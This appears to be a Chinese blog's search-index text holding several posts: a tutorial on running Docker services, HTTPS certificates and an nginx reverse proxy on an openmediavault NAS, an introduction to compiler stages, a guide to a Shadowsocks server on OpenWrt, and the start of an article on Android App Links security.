docker container 命令指定了 --user 参数 docker container run 命令是创建并运行一个容器，docker container create 则仅创建容器而不运行。要运行已有的容器，使用 docker container start 命令 --rm 参数是容器运行结束后自动删除该容器文件，由于默认情况下 Docker 每次启动容器都会新创建一个对应的容器文件， 对于仅一次性运行容器的场景，--rm 参数就会很有用 -v 参数说明：Docker 支持三种文件系统实现：volume，bind mount 和 tmpfs mount，它们分别用不同的方式将容器内的文件/目录和宿主的文件/目录关联，使容器能够访问宿主的文件系统/内存文件系统。 其中 volume 是 Docker 自行管理的文件/目录，也是最易使用的：通过 -v 参数指定一个唯一的 volume name 以及要关联到的容器内文件/目录即可。volume 由 Docker 管理，使用时可以是已经存在或未存在的任一个，当不存在时 Docker 会负责创建；bind mount 是将容器内的目录/文件绑定到宿主上的已有的目录或文件，用法是和 volume 类似，但 -v 参数指定的一定是宿主机上某个相对路径或绝对路径。 -e 参数，增加一个供容器使用的环境变量 PUID/PGID，是 LinuxServer.io 组织提供的镜像特有的实用功能，作为环境变量指定，以指定容器进程运行所用的 UID/GID 创建容器专用用户（可选）出于安全考虑，创建一个专用的低权限用户来运行各项容器，用以实践权限最小化原则。首先直接在 openmediavault 界面中创建一个名为 application 的用户（默认的用户组为 users）。那么，未后续如何使用这个新用户来应用权限最小化安全实践？概括而言就是两个方面操作： 将用户 ID 后续作为所有容器的启动参数，使得容器进程以 application 用户身份和和组运行； 对于需要限制容器访问的目录，通过 ACL 限制 application 用户对该目录的访问。 你可能有疑问，如果容器服务以 application 的 UID 和 GID 运行，在共享目录创建的文件属主将是 application，那其他用户能也访问吗的？ 答案是肯定的。这是因为 openmediavault 共享目录的用户组都是 users，并默认有 setgid 标志位，这使得容器服务在其下创建的子目录和文件将都与共享目录一致，即 users 组。部署 Transmission 容器Transmission 用来下载 BT（支持磁力链接）非常不错，支持 Web 界面和包含认证的 RPC 控制，我们选择 linuxserver 提供的镜像，Docker Hub - linuxserver/transmission容器安装是用 Portainer，具体操作步骤是： 进入 Volumes - Add volume 页面创建 Transmission 容器配置数据存储专用 volume 填写 Name，例如 transmission_config 点击 Create the volume 创建该 volume 进入 Containers - Add container 页面配置容器参数 填写任意的 Name，填写 Image 为 linuxserver/transmission Manual network port publishing 中点击 publish a new network port，按 linuxserver/transmission 在 Docker Hub 页面的要求依次添加端口映射 Volumes - Volume mapping 选项中将专用于存储配置数据的 Volume 即 transmission_config，绑定到 /config 和 /watch；Bind 形式绑定 /downloads 到你指定的 NAS 共享目录。 Env - Environment variables 中添加 PUID、PGID 两个环境变量，如果只想方便可分别填写 1000 和 100 即你的 openmediavault 使用用户和 users 组，如果想最小化运行权限，可填写创建容器专用用户一节创建的 application 用户的 UID 和 GID，同时将第 1 步绑定 downloads 的共享文件夹目录属主修改为 application（用户组保持 users 不变）,开放给容器访问。 Restart policy 中选择 Unless stopped 最后点击 Deploy the container 完成容器部署 部署 Nextcloud 容器建议使用 File Browser 替代Nextcloud 作为云盘软件，实际上主要的文件管理功能完全可以使用 openmediavault 提供的 Samba/NFS 替代，但是如果要在 Internet 上分享文件，后者就十分乏力了。我同样选择 linuxserver 提供的镜像，Docker Hub - linuxserver/nextcloud。之所以不选择官方镜像，是因为其不支持设置容器进程的 UID/GID，无法控制容器进程的读写权限。Nextcloud 容器运行起来后，还要编辑一下它的配置文件，将域名修正为你自己的实际域名，我的例子是 nextcloud.linhongbo.comvim /var/lib/docker/volumes/nextcloud_config/_data/www/nextcloud/config/config.php&amp;lt;?php$CONFIG = array ( &#39;memcache.local&#39; =&amp;gt; &#39;\\\\OC\\\\Memcache\\\\APCu&#39;, &#39;datadirectory&#39; =&amp;gt; &#39;/data&#39;, &#39;instanceid&#39; =&amp;gt; &#39;oc2sfcyt03u3&#39;, &#39;passwordsalt&#39; =&amp;gt; &#39;1234567890abcdefg...&#39;, &#39;secret&#39; =&amp;gt; &#39;1234567890abcdefg...&#39;, &#39;trusted_domains&#39; =&amp;gt; array ( 0 =&amp;gt; &#39;openmediavault&#39;, 1 =&amp;gt; &#39;nextcloud.linhongbo.com&#39;, ), &#39;dbtype&#39; =&amp;gt; &#39;sqlite3&#39;, &#39;version&#39; =&amp;gt; &#39;18.0.1.3&#39;, &#39;overwrite.cli.url&#39; =&amp;gt; &#39;https://nextcloud.linhongbo.com:8443&#39;, &#39;installed&#39; =&amp;gt; true,);部署 File Browser 容器相比 Nextcloud，File Browser 更轻量，博主推荐使用 File Browser，轻量、界面简洁。File Browser 有两个 docker 镜像可供选择：官方镜像，更好用的镜像，推荐使用后者。因为官方镜像无法使用普通用户启动（容器绑定 80 端口需要 root），且配置项也比较奇怪。不想使用 root 用户来运行的注意：Portainer 配置容器参数时，可将 user 参数配置成普通用户的 UID 和 GID，形如：1000:100，同时容器分配、绑定的 volume 目录属主也要相应修改，避免权限问题。假设分配给容器的 volume 名为 file_browser，则要修改属主为对应普通用户的目录是：drwxr-xr-x 3 hongbo users 4096 11月 29 08:16 /var/lib/docker/volumes/file_browser/_data部署 Emby Server 容器相比 Plex 博主更喜欢 Emby。镜像地址：Docker Hub - emby/embyserver同样的，embyserver 容器的 UID/GID 环境变量如果只想方便可分别填写 1000 和 100 即你的 openmediavault 使用用户和 users 组，如果想最小化运行权限，可填写创建容器专用用户一节创建的 application 用户和用户组，同时将第 Emby 的 volume 目录属主修改为 application（用户组保持 users 不变）,开放给容器访问：chown application transmission_volume_directory使用域名访问容器默认情况下，我们会用 IP:端口 方式访问容器提供的 Web 服务，并且用端口号来区分不同的服务，这在容器数量较多时显得非常不优雅。有两种解决方案，分别适用不同场景： 如果你有公开域名并希望容器能够被公网访问，可以在域名 DNS 服务提供商中配置新的容器服务域名，并解析到可访问容器的公网 IP（这通常需要宽带运营商提供公网 IP，并且你已配置好 DDNS） 如果你没有公开域名或仅在局域网访问容器服务，可以配置本地域名。具体方法不一，对于 OpenWrt 来说，以下两种方法均可 在 Luci Web 界面 Network - Hostnames 中添加域名和对应的 IP 地址 在 /etc/hosts，中添加域名和对应的 IP 地址，形如： 192.168.0.2 portainer.linhongbo.com ... 启用 HTTPS出于安全考虑，一些 Web 服务需要启用 HTTPS，尤其是对公网暴露或涉及账户口令的。这里博主采用 Let’s Encrypt 的通配证书方案，并以 openmediavault-webgui 为例启用 HTTPS。申请 Let’s Encrypt 通配证书2018 年 3 月 Let’s Encrypt 终于宣布支持 ACME v2 and Wildcard Certificate，即通配符证书。非常振奋人心，Good Job！申请通配符证书需要在域名的 DNS 上配置 TXT 记录，我们先尝试手动模式申请通配符证书，然后运行一个对应于域名 DNS 服务商的 Certbot 容器来自动申请 手动申请安装 Certbotsudo apt install certbot接着运行如下命令给你的域名申请统配符证书（将命令中的域名替换成你自己的）certbot certonly --manual --preferred-challenges dns --server https://acme-v02.api.letsencrypt.org/directory --manual-public-ip-logging-ok -d &#39;*.linhongbo.com&#39; -d linhongbo.comCetbot 会先提示提供邮箱，这里如实填写，以接收证书过期提醒邮件；然后要求配置一个指定值的名为 _acme-challenge 的 DNS TXT 记录，我们到自己的 DNS 服务商面板上配置即可；最后稍等片刻，先用 dns.google.com 查询一下 TXT 记录是否生效，确认生效后回车。待 Let’s Encrypt 校验域名所有权后，会签发证书，成功申请的输出如下：IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/linhongbo.com/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/linhongbo.com/privkey.pem Your cert will expire on 2018-06-12. To obtain a new or tweaked version of this certificate in the future, simply run certbot-auto again. To non-interactively renew *all* of your certificates, run &quot;certbot-auto renew&quot; - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let&#39;s Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-leCetbot 将证书和私钥归档在 /etc/letsencrypt/archive/yourdomain.domain/ 下，但我们应通过其额外提供的软连接访问，即/etc/letsencrypt/live/linhongbo.com/fullchain.pem/etc/letsencrypt/live/linhongbo.com/privkey.pem 自动申请自动申请能够自动化配置 DNS TXT 记录，这需要 Certbot 安装对应域名服务商的插件，处于方便考虑，直接采用 Docker 容器运行。首先，创建一个用于访问 DNS 服务商 API 的接口配置文件，内容根据你实际 DNS 服务商提的而不同，博主例子是 Cloudflarevim cloudflare.ini# Cloudflare API credentials used by Certbotdns_cloudflare_email = cloudflare@example.comdns_cloudflare_api_key = 0123456789abcdef0123456789abcdef01234其中 dns_cloudflare_email 为 Cloudflare 账号邮箱；dns_cloudflare_api_key 前往 Cloudflare - Profile - API Tokens 获取（这里选则创建权限 Edit zone DNS 的 Token 即可，而不是 Global API Key）。接着在 Docker Hub 上查找到对应的 Certbot 镜像，我的例子是 certbot/dns-cloudflare，然后运行如下命令申请证书sudo docker run -it --rm --name certbot \\ -v &quot;/etc/letsencrypt:/etc/letsencrypt&quot; \\ -v &quot;/var/lib/letsencrypt:/var/lib/letsencrypt&quot; \\ -v &quot;/root/cloudflare.ini:/cloudflare.ini&quot; \\ certbot/dns-cloudflare certonly --preferred-challenges dns --dns-cloudflare --dns-cloudflare-credentials /cloudflare.ini -d *.linhongbo.com -d linhongbo.com --server https://acme-v02.api.letsencrypt.org/directory其中 /root/cloudflare.ini 替换为你自己的文件路径。Letsencrypt 证书三个月过期，到期 renew 时再执行上述 Docker 命令即可，此时会提示证书可以 renew。为 openmediavault-webgui 启用 HTTPSopenmediavault 界面提供了 HTTPS 配置功能，但密钥管理功能很不友好，建议直接采取以下手动方法来启用 HTTPS创建额外的 openmediavault-webgui 配置文件：cd /etc/nginx/openmediavault-webgui.dtouch custom.confvim custom.conf添加如下配置：listen [::]:443 default_server ipv6only=off;ssl_certificate /etc/letsencrypt/live/linhongbo.com/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/linhongbo.com/privkey.pem;最后使用 nginx -s reload 加载配置即可Nginx 反向代理反向代理可以使局域网内的 Web 服务直接通过标准的 HTTP/HTTPS 域名、端口（80/443）访问。openmediavault 预置安装了 Nginx（被其管理界面使用），我们直接复用这个 Nginx 为本机上的各个容器或其他主机上的服务提供反向代理。有两种反向代理配置模式：一种是每个为目标 Web 服务创建一个代理 Subdomain，另一种则是直接在主 Host 下分配 location 目录。前者需要为每个代理 Host 增加 DNS 记录，配置和维护起来稍显麻烦，好处是对浏览器比较友好；后者则只需维护一个主 Host 的 DNS，配置起来也相对简洁容易。location 目录反向代理创建并编辑 /etc/nginx/openmediavault-webgui.d/proxy.conf，按如下可用的 filebrowser、Portainer、Emby、transmission 的反向代理配置：location /filebrowser { # prevents 502 bad gateway error proxy_buffers 8 32k; proxy_buffer_size 64k; client_max_body_size 75M; # redirect all HTTP traffic to localhost:9001; proxy_pass http://localhost:9001; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #proxy_set_header X-NginX-Proxy true; # enables WS support proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_read_timeout 999999999;}location /portainer/ { proxy_http_version 1.1; proxy_set_header Host $host; proxy_set_header Connection &quot;&quot;; proxy_pass http://localhost:9000/;}location /portainer/api/websocket/ { proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_http_version 1.1; proxy_pass http://localhost:9000/api/websocket/;}location /emby/ { # prevents 502 bad gateway error proxy_buffers 8 32k; proxy_buffer_size 64k; client_max_body_size 75M; # redirect all HTTP traffic to localhost:9001; proxy_pass http://localhost:9003/; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #proxy_set_header X-NginX-Proxy true; # enables WS support proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_read_timeout 999999999;}location /transmission { # prevents 502 bad gateway error proxy_buffers 8 32k; proxy_buffer_size 64k; client_max_body_size 75M; # redirect all HTTP traffic to localhost:9002; proxy_pass http://localhost:9002; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #proxy_set_header X-NginX-Proxy true; # enables WS support proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &quot;upgrade&quot;; proxy_read_timeout 999999999;}Subdomain 反向代理以配置 Nextcloud 为例，首先创建其 Subdomain 配置文件：vim /etc/nginx/sites-available/nextcloudserver { #常规 HTTP/HTTPS 端口，用于局域网访问。遵循一端口全局仅配置一次 ipv6=off 规则，例如 openmediavault 的 80 或 443 端口的配置语句已经包含了 `ipv6only=off`，下面就要去除掉对应的 `ipv6only=off` listen [::]:80 ipv6only=off; listen [::]:443 ipv6only=off ssl http2; #出于安全考虑，如果该服务需要被公网访问，额外监听一个端口作为转发专用端口，以对接路由器 WAN 侧 #listen [::]:8443 ipv6only=off ssl http2; server_name nextcloud.linhongbo.com; ssl_certificate /etc/letsencrypt/live/linhongbo.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/linhongbo.com/privkey.pem; ssl_verify_client off; proxy_ssl_verify off; location / { proxy_pass http://localhost:9096; proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; }}其中， ipv6only=off 表示监听的 ipv6 socket 既可以处理 ipv6 也可以处理 ipv4 数据包（这是 Linux 的一个新特性，新版 Ningx 默认为 on，即在该端口上仅监听 ipv6 数据包）。这个选项可以使配置更简洁，而无需（且不能）额外配置 ipv4 监听语句，形如 listen 0.0.0.0:80。但要注意如果有多个 server 块监听同一端口，这种写法要求该端口的 ipv6only=off 选项必须且只能出现一次，否则会导致 Address already in use 错误（两个端口同时处理 ipv4 请求）或无法处理 ipv4 请求。也就是说由于 openmediavault WEB 界面自身监听的 80 端口和 443 端口（如果启用 HTTPS）在其配置文件中已经配置了 ipv6only=off，遵循只能出现一次的规则，你额外的 Subdomain 配置中 80 和 443 端口就不需且不能再配置 ipv6only=off 了。 server_name 指定服务对应的域名 ssl_certificate 和 ssl_certificate_key 分别填写先前申请的 Let’s Encrypt 证书、私钥文件； proxy_ssl_verify off 表示关闭 Nginx 到上游服务器（Nextcloud 容器服务）的 SSL/TLS 校验，由于我是反向代理到 Nextcloud 容器的 HTTPS 服务，因此该选项必须。 proxy_set_header Host $http_host 表示反向代理时替换掉 HTTP Header 中的 host 参数，这对 Nextcloud 是必要的，否则会报域名不被信任的错误； proxy_pass https://localhost:9443 设置被代理容器监听的本地回环地址和端口号； proxy_set_header X-Real-IP $remote_addr 和 proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for 指示 Nginx 发起反向代理请求时增加原始 IP 字段到 HTTP Header，这对一些依赖源 IP 来认证客户端的 Web 服务非常重要，例如 Emby，由于反向代理时 Nginx 位于 localhost 或局域网，如不设置此参数 Emby 将认为请求是来源于局域网，从而造成安全功能误判。因此建议所有被代理服务配置上此选项。 http2 支持 http2，加速网站加载。注意仅 HTTPS 支持此特性。将上述配置文件拷贝到 /etc/nginx/sites-enabled 目录使能起来，这里应用软链接ln -s /etc/nginx/sites-available/nextcloud /etc/nginx/sites-enabled/nextcloud命令 Nginx 重新加载配置nginx -s reload端口转发（公网访问）最后，为了能在公网访问 openmediavault 上的 WEB 服务，需要在路由器的防火墙规则中增加一条 WAN:8443 -&amp;gt; openmediavault:8443 的 tcp 端口转发规则，这里 WAN 域端口选择 8443 而非 HTTPS 默认的 443 端口是因为该端口已运营商防火墙封锁了。此外由于 80 端口亦被封锁，博主不再配置 HTTP（80）端口的转发规则，因为不会带来任何访问上的裨益（网址仍要指定端口才能访问）。VPNVPN 可以在公网和家庭局域网之间创建隧道，从而容易访问内网的各项服务。很多路由器都提供了这项功能。如果你想使用 Shadowsocks 来替代 VPN，可以参考博主的这篇文章：OpenWrt 安装 Shadowsocks Serveraria2transmission 只支持 BT 下载，对于 HTTP 下载，就需要安装额外的软件来补充了。博主选择 aria2。本文采用裸机安装而非容器，方法参见另外一篇文章另外，aira2 本身只对外提供 RPC 接口，还需要搭配前端界面才行，选项如下： Browser：AriaNg Android：Aria2App前者搭配 Nginx 反向代理时的配置如下：server { listen [::]:80; listen [::]:443 ssl http2; server_name aria2.example.com; client_max_body_size 25M; ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem; ssl_verify_client off; proxy_ssl_verify off; location / { root /var/www/ariang; # ariang 安装目录 index index.html; } location /jsonrpc { # 对应 ariang 需要修改的 RPC 地址 proxy_pass http://localhost:6800/jsonrpc; # 用这种方式实现 HTTPS 反向代理 HTTP RPC，否则浏览器拒绝访问 }}常见问题反向代理性能差默认配置，Nginx 会将后端请求缓存起来（如果缓存空间不够还会写入本地文件）再发送给客户端，这样就会对 Emby 等大流量数据流场景形成性能瓶颈，导致卡顿现象。解决办法是在对应域名的 server 块中加入如下一行配置（建议在 nginx.conf - http 中全局配置）proxy_buffering off;这样，Nginx 获取到后端响应就会立即传送给客户端。" }, { "title": "编译器介绍", "url": "/posts/introduction-to-compiler/", "categories": "Programing", "tags": "Compiler", "date": "2020-02-27 00:00:00 +0800", "snippet": "分层前端（frontend）将源代码翻译为一个中间表示（intermediate representation, IR）。clang 是 LLVM 中 C 系语言的前端。词法分析词法分析是为了识别输入（源代码）中特定单词的准确含义，比如一个单词到底是语言的关键字还是程序员自定义的变量名？注释开始结束？这些分析结果将作为后续语法分析的输入。词法分析器基本原理是正则表达式+action，即匹配到正则表达式时采取某个action。例如：匹配到 /*...*/ 时什么也不做，匹配到 int a 时识别到 int 是一个类型关键字，a 是标识符。最后将上述判断输出。lex 是 Linux 上的语法分析工具，定制好词法（正则和 action）规则后即可产生词法分析程序。语法分析语法分析的原理就是检查给定的句式是否满足特定的语法。语法（Grammer）是描述语言语法结构的规则形式，在编译器中是树形的。比如，汉语言可以用下面的语法表示：句子 : 子句子 宾语子句子 : 主语 谓语主语 : 你|我|他…宾语 : 饭|水…其中每一行称为一个产生式（production），粗体的是非终结符（nonterminal），细体的是终结符（terminal）。终结符是语法中最基本的元素，无法再分割，非终结符则可分解为n个终结符的组合。可以看到这种表示形式自上而下由根逐级分解，像一颗树，因此又被称之为语法树（syntax tree）或语法分析属（parse tree）。检查给定的句式是否满足语法有两个思路： 推导（derivation）推导是正向的，从语法的开始处（根产生式），逐级分解到非终结符，如果输出句式和目标句式一致表明句式正确。推导过程中，选择什么路径影响到效率（如果发生句式不匹配甚至要回溯），因此会有优化算法，比如递归算法和 LL(1) 算法 归约（reduction）规约是反向思路，将目标句式从一个个终结符逐步向上替换成产生式，最终如果能归一到语法的根节点，说明目标句式语法正确。实现上可以使用栈：将目标句式的终结符逐步压入栈中，压入的过程中如果发现栈中内容能归约到某个产生式，则向上归约转换，否则继续压入目标句式的下一个终结符，直到能够继续归约。最终，如果目标句式语法正确，则一定能归约到语法的根节点。（有点儿像俄罗斯方块）。归约也存在路径选择问题，因此也有优化算法，比如 LR(1)对于程序语言来说，主要使用归约法，和上述汉语言的归约过程别无二致，唯一的区别是语法树不同而已。也就是说，程序语言中，int **、+、-、(** … 等都是终结符，语法分析过程就是对它们进行归约分析。当然，最重要的工作显然是语法树的确立，这里不细说。yacc 是 Linux 上的语法分析工具，它用 %token 标识终结符（大写字母），非终结符用小写。定制好语法树规则（以及辅助信息）后即可产生词法分析程序。 词法分析和语法分析如何合作？（lex 和 yacc ）词法分析为语法分析提供输入，我们知道归约语法分析的输入是终结符，词法分析步骤即按语法分析器定义的终结符形式识别、分析出所有的终结符，最终输入给语法分析器。比如源码中的 int 是终结符 INT 的关键字，那么 lex 会将其输出为一个 INT 的 token （终结符）。yacc 检查语法树，确定是否有语法错误。语义分析归约过程是自语法树自下而上的，一种主流的语义分析方法，语法制导转换（syntax directed translation，或语法制导翻译），即在归约到某个指定的产生式（production）时触发特定的动作（语义分析动作）。举例来说，declarartion : declarartion_specifiers &#39;;&#39; | declaration_specifers init_declarator_list &#39;;&#39; 是某个变量定义产生式，如果语法分析时归约到到 int* c 时，进入此产生式，表明源代码定义了一个变量，那么我们就分析出了变量定义这个行为，可以在对应的动作输出 “Find a new symbol” ，并将其记录到一个符号表结构体（链表）中，记录为 @int*_c，表明其类型和名称。 静态语义检查，在编译过程中对源代码进行语义检查，c/c++ 只采用静态语义检查 动态语义检查，在程序运行过程中的检查，比如数组越界等，java 等语言支持动态语义检查，为了实现动态检查，编译器要在目标程序中插入额外的检查代码 IR 生成IR 生成可以在语义分析的action中触发（设置IR生成对应的 action），IR 的类型可以是单地址、二地址以及三地址形式。 一地址：指令的操作数和操作结果都存储在栈中。比如 Java 字节码 二地址：指令的操作结果会存储到操作数的存储空间里。类似于 Intel X86 汇报指令格式 三地址：操作数、操作结果都有自己的存储空间。比如 DEX 字节码，由于 ARM CPU 中寄存器很多，采用此类型的 IR，灵活度最高。代码如何翻译成 IR ? 内容很复杂，概括来说包括语句（statement）和表达式（expression）的翻译，还涉及类型系统、对函数调用的抽象（包括如何在调用者和被调用者之间传递参数和返回值 ）优化器（optimizer）对 IR 进行分析，并将其翻译成一个更高效的形式（可以是与之前同一类 IR ，也可能是另外一种 IR）。opt 是 LLVM 的优化器工具。优化器是基于 控制流（control flow）和数据流（data flow）来做的 控制流图描述程序结构的相关信息。优化器用控制流图（Control Flow Graph）来表示它。控制流图包含两类基本元素：基本块（Basic Block）和边（edge）。基本块是代码中不包含分支语句的部分，而边则代表跳转关系（比如true、false时走到哪个基本块，用箭头表示），这样程序就可以完全用控制流图表示。实现一个控制流图提取器也比较简单，判断目标 IR 中的分支指令即可分割出各个基本块。有了 CFG ，就可以做一些优化了，比如循环优化、无用代码剔除等 +----------+ | x=z-2; | | y=2*z; |(Basic Block) | if(c) | +--+-----+-+ True | | False v v+--------+-+ ++---------+| x=x|1; | | x=x|1; || y=y+1; | | y=y-1; || | | |+--------+-+ +-+--------+ | |(edge) v v +-+------++ | z=x+y; | | | +---------+CFG 实例（对于 ART 编译器来说，它仅包含优化器和后端而没有前端，它的优化器处理的是 dex 字节码 IR，控制流图也是从字节码中提取出来的，源代码 block_builder.cc） 数据流后端（backend）通过将 IR 映射为目标硬件的指令集生成机器码。llc 是 LLVM 的后端工具compiler vs. interpreter编译器：是一种计算机程序，将一个一种语言编写的源码转换为另一个计算机语言（即目标语言，包括可直接执行的机器码、不可直接执行的另一种计算机代码），编译成的目标语言文件可以直接被执行或需要再编译后执行或由解释器解释执行；解释器是一种计算机程序，直接执行由编程语言或脚本语言编写的代码，并不会把源代码预先地编译成机器码，有三类执行策略 解析源代码，并直接执行行动。（例如bash脚本语言，脚本文件一行一行直接被运行） 把源代码翻译成相对更加高效率的中间码，然后立即执行它。 内部包含一个编译器，先编译存储（例如缓存）好代码，然后执行。 （有编译器？那涉及 JIT 和 AOT！）参考：你知道「编译」与「解释」的区别吗？JIT vs. AOT术语 Ahead-of-Time (AOT) 和 Just-in-Time (JIT) 指的是编译什么时候发生，其中的“-time”指的是术语“runtime”，也就是说 JIT 编译器是运行时编译，而 AOT 编译器是运行前编译。值得注意的是，这两个术语只适用于编译器，对于解释器，“运行时解释或运行前解释的解释器”是没有意义的，因为解释器总是在运行的时候解释 ：)参考：Understanding the differences: traditional interpreter, JIT compiler, JIT interpreter and AOT compiler参考An Intro to Compilers" }, { "title": "OpenWrt 安装 Shadowsocks Server", "url": "/posts/shadowsocks-server-on-openwrt/", "categories": "Tutorial, Shadowsocks", "tags": "Shadowsocks", "date": "2020-02-22 00:00:00 +0800", "snippet": "简介在 OpenWrt 路由器上安装 server 版 Shadowsocks，使得客户端设备能够以 VPN 的形式远程连接到家庭局域网。安装 Shadowsocks ServerStep 1 - 安装 shadowsocks-libev-server 软件包前往作者项目主页获取最新版本的 shadowsocks-libev-server 并安装，安装之前用如下命令查询自己路由器 CPU 所属的平台架构opkg print-architecture也可以使用软件源的方法安装，参考 OpenWrt Shadowsocks 安装&amp;amp;配置指南 添加软件源，然后执行以下命令安装opkg install shadowsocks-libev-serverStep 2 - 创建配置文件vim /etc/shadowsocks-server.json{ &quot;server&quot;:[&quot;[::0]&quot;,&quot;0.0.0.0&quot;], &quot;server_port&quot;:8888, &quot;password&quot;:&quot;xxxxxxx&quot;, &quot;timeout&quot;:60, &quot;method&quot;:&quot;aes-128-gcm&quot;, &quot;fast_open&quot;:true}Step 3 - 创建开机启动脚本出于安全考量，安装 sudo 来切换程序运行的用户和用户组opkg install sudo然后编辑 /etc/rc.local 启动脚本，增加一行启动命令：## 在文件最后， exit 0 之前（如果有的话）加此行启动命令sudo -u nobody -g nobody ss-server -u -c /etc/shadowsocks-server.json &amp;amp;Step 4 - 添加防火墙规则点击 Firewall - Traffic Rules 添加一条防火墙规则，使得 WAN 侧（即 Internet）能够访问到 Shadowsocks 监听的端口到此所有安装配置工作完成。远程连接到内部网络以 Android 客户端为例：路由规则根据需要选择全局 或 绕过中国大陆，让手机连接到路由器以访问内部网络，此外为了能正常解析域名（包括内网主机名），还需要将 远程 DNS 选项修改为 192.168.1.1（指向 OpenWrt 内建的 dnsmasq DNS 服务）并勾选 使用 UDP DNS。注意：适用于旧版客户端，新版客户端须参考以下文章更新。2021-06 更新：新版本 Shadowsocks 客户端 DNS 按上述方法配置似乎只能解析内网主机，外网无法解析，原因不明，此时保持默认的 dns.google 即可修复（但无法解析内网）。2022-02 更新：造成上述异常的实际原因是新版本 Shadowsocks Android 客户端不再支持使用 UDP 来请求远程 DNS 服务器，只会用 TCP 来请求，那么当远程 DNS 设置为路由器上的 dnsmasq 时，虽然 dnsmasq 支持 TCP，但若其配套的上游 DNS 服务器（例如 ChinaDNS）不支持 TCP（可以通过 netstat -nalp 确定这一点），则客户端的 TCP DNS 请求在转发给这些上游 DNS 时就会失败（dnsmasq 日志显示 REFUSED）。终极解决办法（不稳定）：在 dnsmasq 的 DNS forwardings 选项中额外加入支持 TCP 请求的 8.8.8.8#53 作为备用 DNS（多个上游 DNS 存在时，dnsmasq 会按次序请求，仅当请求失败时使用后续的 DNS，因此此操作几乎没有副作用）。参考：dnsmasq 一直返回 REFUSED" }, { "title": "App Links 及其安全性", "url": "/posts/app-links-and-its-security/", "categories": "Android", "tags": "", "date": "2020-02-07 00:00:00 +0800", "snippet": "在 Android 上 Google 提供了一套名为 App Links 和 Deep Links 的由 URI/URL 跳转到原生 Android 应用组件的协议及实现，使得用户从能够从原生应用（包括浏览器页面）直接通过链接跳转到指定的应用内容。本文详细介绍了它们如何运作，并剖析了其中的安全性。App Links 的实现细节及与 Deep Links 间区别App Links 是一种特殊类型的 Deep Links，可以看作是 Deep Links 的升级版本（Android 6.0 引入）。二者主要区别在于：当用户点击 App Links 时将直接跳转到应用内容，而 Deep Links 则会弹出应用选择对话框（如果用户设备上有多个应用可以处理相同的 intent）。举例来说：在电子邮件中点击银行发送的 HTTP 网址，如果是 Deep Link 系统可能会显示一个对话框，询问用户是使用浏览器还是银行自己的应用打开此链接，而 App Link 则直接跳转到应用。此外二者的形式上也存在区别：App Links 和传统 HTTP URL 链接格式保持一致，并且一定关联于某一个 Web 站点 ，这意味着当用户没有安装实体应用时，App Links 就直接呈现为 Web 网站内容，而不会出现 404 页面或异常；Deep Links 则更加宽泛，它的 URI 在 http/https 协议之外还支持自定义 scheme ，意味着如果是自定义 schema，Deep Links 虽可在浏览器中使用，但却不指向 Web 网站内容，且当应用不存在时，跳转也将失效。一言以概之，由于只支持 http/https 协议并关联到网站，App Links 可以简单理解为传统网站内容的应用版本。在开发层面，创建一个完整的 App Links 包括： 遵循完整的 Deep Links 创建过程 ：在 Android 应用清单中为 URI 创建对应的 intent 过滤器，即在目标 Activity 的 intent-filter 中，data 标签下配置一个或多个 URI（URI 支持细粒度路径，从而让不同 Activity 匹配不同 URI 路径），并且将应用设置为能够正确处理包含来自网站内容的 intent。创建 App Links 的要点仅仅是前述 URI 只能为 http/https 协议。 要求应用和网站之间建立认证关联，这是网站上发布 Digital Asset Links JSON 文件实现的，在安全性中将展开说明。 &amp;lt;activity android:name=&quot;com.example.android.GizmosActivity&quot; android:label=&quot;@string/title_gizmos&quot; &amp;gt; &amp;lt;intent-filter android:label=&quot;@string/filter_view_http_gizmos&quot;&amp;gt; &amp;lt;action android:name=&quot;android.intent.action.VIEW&quot; /&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&amp;gt; &amp;lt;!-- Accepts URIs that begin with &quot;http://www.example.com/gizmos” --&amp;gt; &amp;lt;data android:scheme=&quot;http&quot; android:host=&quot;www.example.com&quot; android:pathPrefix=&quot;/gizmos&quot; /&amp;gt; &amp;lt;!-- note that the leading &quot;/&quot; is required for pathPrefix--&amp;gt; &amp;lt;/intent-filter&amp;gt; &amp;lt;intent-filter android:label=&quot;@string/filter_view_example_gizmos&quot;&amp;gt; &amp;lt;action android:name=&quot;android.intent.action.VIEW&quot; /&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&amp;gt; &amp;lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&amp;gt; &amp;lt;!-- Accepts URIs that begin with &quot;example://gizmos” --&amp;gt; &amp;lt;data android:scheme=&quot;example&quot; android:host=&quot;gizmos&quot; /&amp;gt; &amp;lt;/intent-filter&amp;gt;&amp;lt;/activity&amp;gt;引用官网的表格，完整展示二者的区别：   Deep Link App Link intent 网址协议 http、https 或自定义协议 需要 http 或 https intent 操作 任何操作 需要 android.intent.action.VIEW intent 类别 任何类别 需要 android.intent.category.BROWSABLE 和 android.intent.category.DEFAULT 链接验证 无 需要通过 HTTPS 